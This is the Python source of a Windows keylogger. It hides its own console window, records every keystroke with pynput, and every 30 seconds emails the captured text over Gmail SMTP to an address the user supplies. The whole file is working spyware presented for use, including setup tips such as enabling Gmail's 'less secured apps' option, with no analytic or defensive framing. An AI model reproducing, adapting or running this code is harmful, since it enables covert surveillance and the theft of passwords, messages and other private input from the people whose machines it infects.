import pynput.keyboard
import smtplib
import os
import shutil
import subprocess
import sys
import time
import threading

class Keylogger:


    def __init__(self):
        self.log = ""
        self.email = "email to receive key logger logs"
        self.interval = 30 #delay for each mail
        self.hide()
        self.start()
        
    def hide(self):
        import win32console
        import win32gui
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)
        

    def append_to_log(self, string):
        self.log = self.log + string

        
    def report(self):
        self.send_mail(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
            

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def send_mail(self, message):
        print("sent")
        message = "Subject: Key Logger Report\n\n\nLogs:\n" + message
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login("mail id used to send logs","password") #Don't forgot to enable less secured apps in gmail
        server.sendmail( "mail id used to send logs", self.email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

Keylogger()


